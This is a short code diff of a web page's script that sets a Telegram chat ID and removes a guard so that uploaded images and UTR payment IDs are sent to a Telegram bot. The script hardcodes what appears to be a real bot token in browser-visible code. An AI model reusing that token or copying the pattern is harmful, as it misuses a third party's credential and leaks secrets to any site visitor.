@@ -381,7 +381,7 @@
             // TELEGRAM BOT CONFIGURATION
             // ==========================================
             const botToken = "8832657466:AAE_O-t4bDOOF_t_kW5MV2K-3BoX7mBASvw";
-            const chatId = "YOUR_CHAT_ID_HERE"; // IMPORTANT: Replace this with your actual Chat ID!
+            const chatId = "8522410574"; // Updated with provided ID
             // ==========================================
 
             const urlParams = new URLSearchParams(window.location.search);
@@ -453,11 +453,6 @@
 
             // Telegram API Function
             function sendToTelegram(imageFile, utrId) {
-                if(chatId === "8522410574") {
-                    console.error("Chat ID is missing. Telegram message not sent.");
-                    return;
-                }
-
                 const now = new Date();
                 const dateStr = now.toLocaleDateString('en-IN');
                 const dayStr = now.toLocaleDateString('en-IN', { weekday: 'long' });
